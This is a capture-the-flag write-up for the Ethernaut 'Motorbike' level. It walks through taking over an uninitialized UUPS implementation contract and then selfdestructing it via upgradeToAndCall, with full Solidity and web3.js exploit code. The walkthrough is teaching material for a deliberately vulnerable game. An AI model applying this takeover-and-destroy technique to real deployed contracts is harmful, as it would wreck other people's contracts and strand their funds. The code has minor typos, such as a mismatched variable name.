# Level 25: Motorbike

This is the level 24 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites
- [delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how) in Solidity
- [selfdestruct](https://docs.soliditylang.org/en/v0.6.0/units-and-global-variables.html#contract-related) function in Solidity
- [Proxy Patterns](https://blog.openzeppelin.com/proxy-patterns/)
- [UUPS Proxies](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)
- [OpenZeppelin Proxies](https://docs.openzeppelin.com/contracts/4.x/api/proxy)
- [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract

## Hack

Given contracts:
```solidity

// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }
    
    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

`player` has to make the proxy (`Motorbike`) unusable by destroying the implementation/logic contract (`Engine`) through `selfdestruct`.

As you can see current `Engine` implementation has no `selfdestruct` logic anywhere. So, we can't call `selfdestruct` with current implementation anyway. But, since it is a logic/implementation contract of proxy pattern, it can be upgraded to a new contract that has the `selfdestruct` in it.

`upgradeToAndCall` method is at our disposal for upgrading to a new contract address, but it has an authorization check such that only the `upgrader` address can call it. So, `player` has to somehow take over as `upgrader`.

The key thing to keep in mind here is that any storage variables defined in the logic contract i.e. `Engine` is actually stored in the proxy's (`Motorbike`'s) storage and not actually `Engine`. Proxy is the storage layer here which delegates _only_ the logic to logic/implementation contract (logic layer). 

What if we did try to write and read in the context of `Engine` directly, instead of going through proxy? We'll need address of `Engine` first. This address is at storage slot `_IMPLEMENTATION_SLOT` of `Motorbike`. Let's read it:

```javascript
implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')

// Output: '0x000000000000000000000000<20-byte-implementation-contract-address>'
```
This yields a 32 byte value (each slot is 32 byte). Remove padding of `0`s to get 20 byte `address`:
```javascript
implAddr = '0x' + implAddr.slice(-40)

// Output: '0x<20-byte-implementation-contract-address>'
```

Now, if we sent a transaction directly to `initialize` of `Engine` rather than going through proxy, the code will run in `Engine`'s context rather than proxy's. That means the storage variables - `initialized`, `initializing` (inherited from `Initializable`), `upgrader` etc. will be read from `Engine`'s storage slots. And these variables will most likely will contain their default values - `false`, `false`, `0x0` respectively because `Engine` was supposed to be only the logic layer, not storage.
And since `initialized` will be equal to `false` (default for `bool`) in context of `Engine` the `initializer` modifier on `initialize` method will pass!

Call the `initialize` at `Engine`'s address i.e. at `implAddr`:
```javascript
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")

await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })
```

Alright, invoking `initialize` method must've now set `player` as `upgrader`. Verify by:
```javascript
upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")

await web3.eth.call({from: player, to: implAddr, data: upgraderSig}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()

// Output: true
```

So, `player` is now eligible to upgrade the implementation contract now through `upgradeToAndCall` method. Let's create the following malicious contract - `BombEngine` in Remix:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract BombEngine {
    function explode() public {
        selfdestruct(address(0));
    }
}
```
Deploy `BombEngine` (on same network) and copy it's address.

If we set the new implementation through `upgradeToAndCall`, passing `BombEngine` address and encoding of it's `explode` method as params, the existing `Engine` would destroy itself. This is because `_upgradeToAndCall` delegates a call to the given new implementation address with provided `data` param. And since `delegatecall` is context preserving, the `selfdestruct` of `explode` method would run in context of `Engine`. Thus `Engine` is destroyed.

Upgrade `Engine` to `BombEngine`. First set up function data of `upgradeToAndCall` to call at `implAddress`:
```javascript
bombAddr = '<BombEngine-instance-address>'
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

upgradeParams = [bombAddr, explodeData]

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
```

Now call `upgradeToAndCall` at `implAddr`:
```javascript
await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})
```

Boom! The `Engine` is destroyed! The `Motorbike` is now useless. `Motorbike` cannot even be repaired now because all the upgrade logic was in the logic contract which is now destroyed.

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
